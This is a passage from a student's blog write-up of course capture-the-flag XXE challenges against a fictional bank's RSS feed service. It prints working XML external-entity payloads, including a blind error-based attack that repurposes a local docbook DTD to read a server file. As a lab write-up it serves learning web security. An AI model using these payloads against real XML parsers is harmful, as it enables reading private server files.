+<span class=cp>&lt;!ENTITY % B &#34;///fla&#34;&gt;</span>
+<span class=cp>&lt;!ENTITY % C &#34;g_a45bd0049717dc50a366e2f5d97d743f&#34;&gt;</span>
+<span class=cp>&lt;!ENTITY % PATH &#34;%A;%B;%C;&#34;&gt;</span>
+
+<span class=cp>&lt;!ENTITY % open_fleg &#39;&lt;!ENTITY &amp;#37; fleg SYSTEM &#34;%PATH;&#34;&gt;</span>&#39;&gt; %open_fleg;
+<span class=cp>&lt;!ENTITY % get_fleg &#39;&lt;!ENTITY &amp;#37; WINNER_WINNER_CHICKEN_DINNER SYSTEM &#34;%fleg;&#34;&gt;</span>&#39;&gt; %get_fleg;
+
+%WINNER_WINNER_CHICKEN_DINNER</code></pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=v4>V4</h2><p>Site: v4.feedifier.-QBSITE-</p><blockquote><p>NOTES(adamyi@): It seems that this service has been sending out really weired requests to random servers and triggered internal security alert. I looked into the traffic and noted that QuoccaBank internal confinential data was exfiltrated. I don&rsquo;t know why this happens because my code is absolutely secure&hellip; let me call nsa to see if they know anything about this&hellip; For now, I just set up a firewall to drop those suspicious requests. I even disabled the outputs of this service. who cares if our users are getting their results back as long as we are secure I also just installed docbook (<a href=http://ftp.au.debian.org/debian/pool/main/d/docbook/docbook_4.5-6_all.deb>http://ftp.au.debian.org/debian/pool/main/d/docbook/docbook_4.5-6_all.deb</a>) on the server to write a post-mortem on the data exfiltration.</p></blockquote><p>This time, all outbound connections (apart from the feed page itself) are dropped.<br>The feed output is also dropped - however like the other versions, the error messages still show - so thankfully we aren&rsquo;t doing this completely blind.</p><p>Parameter entities require us to use an external DTD file, however in this case we cannot, as all outbound connections are blocked. However, the hint given was that docbook is installed&hellip;<br>Docbook contains local DTD files, which can be used!</p><p>The general rationale with exploiting local DTD files, is that once a entity has been defined; any new definition of the same entity is ignored.<br>This means that we can define an entity, and then import a local DTD file that happens to execute/evaluate that entity. Boom injection.</p><p>In the case of this example, I overrode onto the <code>ISOamso</code> entity (which the internet suggests).<br>First, load the flag, then write the error-based methods to leak the flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-rss data-lang=rss><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-rss data-lang=rss><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+
+<span class=cp>&lt;!DOCTYPE data [
+</span><span class=cp>	&lt;!ENTITY % importDocbook SYSTEM &#34;file:///usr/share/sgml/docbook/dtd/4.5/docbookx.dtd&#34; &gt;</span>
+	<span class=cp>&lt;!ENTITY % ISOamso &#39;&lt;!ENTITY &amp;#37; flag SYSTEM &#34;file:///flag_9d88f8807d173ab2a6c2e839eef83553&#34;&gt;&lt;!ENTITY &amp;#37; win &#34;&lt;!ENTITY &amp;#38;#37; yeet SYSTEM &amp;#39;&amp;#37;flag;&amp;#39;&gt;</span>&#34;&gt;&#39;&gt;
+
+	%importDocbook;
+	%win;
+]&gt;
+
+<span class=nt>&lt;rss&gt;</span>
+	<span class=nt>&lt;channel&gt;</span>
+		<span class=nt>&lt;item&gt;</span>
+			<span class=nt>&lt;title&gt;&lt;/title&gt;</span>
+			<span class=nt>&lt;link&gt;&lt;/link&gt;</span>
+			<span class=nt>&lt;description&gt;&lt;/description&gt;</span>
+		<span class=nt>&lt;/item&gt;</span>
+	<span class=nt>&lt;/channel&gt;</span>
+<span class=nt>&lt;/rss&gt;</span></code></pre></td></tr></table></div></div><p>Source: <a href=https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd>https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd</a><br>Source: <a href=https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/>https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote></div><footer class=post-footer><nav class=post-nav><a class=prev href=../../../post/tools/flag_alert/><i class="iconfont icon-left"></i><span class="prev-text nav-default">Flag Alert</span>
+<span class="prev-text nav-mobile">Prev</span></a>
+<a class=next href=../../../post/server-side-security/><span class="next-text nav-default">Server Side Security</span>
+<span class="next-text nav-mobile">Next</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div></div></main><footer id=footer class=footer><div class=social-links><a href=mailto:z5206677@student.unsw.edu.au class="iconfont icon-email" title=email></a><a href=https://www.linkedin.com/in/andrewjinmengwong/ class="iconfont icon-linkedin" title=linkedin></a><a href=https://github.com/featherbear class="iconfont icon-github" title=github></a><a href=https://www.instagram.com/_andrewjwong/ class="iconfont icon-instagram" title=instagram></a><a href=../../../index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a></div><div class=copyright><span class=power-by>Powered by <a class=hexo-link href=https://gohugo.io>Hugo</a></span>
+<span class=division>|</span>
+<span class=theme-info>Theme -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
+2020
+<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>Andrew Wong (z5206677)</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script type=text/javascript src=../../../dist/even.26188efa.min.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-107434487-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=../../../js/typed.js@2.0.9></script><script src=../../../js/typedjs.shortcode.js></script><script src=../../../js/offsite.js></script></body></html>
